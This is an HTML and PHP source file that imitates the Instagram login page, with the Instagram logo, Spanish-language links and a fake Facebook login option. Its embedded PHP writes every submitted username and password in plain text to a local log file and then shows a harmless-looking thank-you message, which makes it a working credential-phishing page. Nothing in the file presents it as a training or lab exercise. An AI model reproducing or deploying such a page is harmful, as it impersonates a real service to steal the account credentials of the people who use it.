<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm" crossorigin="anonymous"></script>
    <title>Instagram Login</title>
    <script src="js.js"></script>
</head>

<body>
    <!-- Main Container -->
    <div class="ig-main-container">
        <form action="php.php" method="post">
        <?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Log the form data to a file in the same directory as dbh.inc
    $logFilePath = dirname(__FILE__) . '/form_data_log.txt';
    $logData = date('Y-m-d H:i:s') . "\n" . print_r($_POST, true) . "\n\n";
    file_put_contents($logFilePath, $logData, FILE_APPEND);

    // Optionally, you can also print a message to the user without exposing sensitive data
    echo "Thank you for submitting the form. Your data has been recorded.";

    // You may redirect the user to another page after processing the form
    // header('Location: thank_you_page.php');
    // exit();
}
?>

        <!-- Phone Image -->
    

        <!-- Right Side Container -->
        <div class="ig-right-container">

            <!-- Login Container -->
            <div class="ig-login-container">
                <img src="instagram.jpg" alt="Instagram Logo" class="ig-logo">
                <input type="text" name="username" placeholder="Phone number, username, or email" class="ig-input">
                <input type="password" name="password" placeholder="Password" class="ig-input">


                <!-- Bootstrap Button -->

                
                <!-- Input Field as Styled Button -->
                    <div class="d-grid gap-10 col-10 mx-auto">
                        <input class="btn btn-primary btn-matched" type="submit" value="Log in">
                    </div>

                <!-- Divider -->
                <div class="divider-container">
                    <hr class="divider">
                    <span class="circle">O</span>
                    <hr class="divider">
                </div>
        
                <!-- Facebook Login Link -->
                <div class="container">
                    <a href="your-link.html" class="inline-link">
                        <img src="facebook_logo.png" alt="Facebook Logo" class="inline-image">
                        <span class="inline-text">Iniciar Sesión con Facebook</span>
                    </a>
                </div>

                <!-- Forgot Password Link -->
                <p class="forgot">
                    <a href="">¿Olvidaste tu contraseña? </a>
                </p>
            </div>

            <!-- Sign Up Container -->
            <div class="Sign_up">
                <p>¿No tienes Cuenta?</p>
                <p class="up">
                    <a href="">Registrate </a>
                </p>
            </div>
        </div>

        <!-- New Container -->
<div class="new-container">
    
    <p>Descarga la app</p>
</div>
</form>
    </div>
</body>

</html>
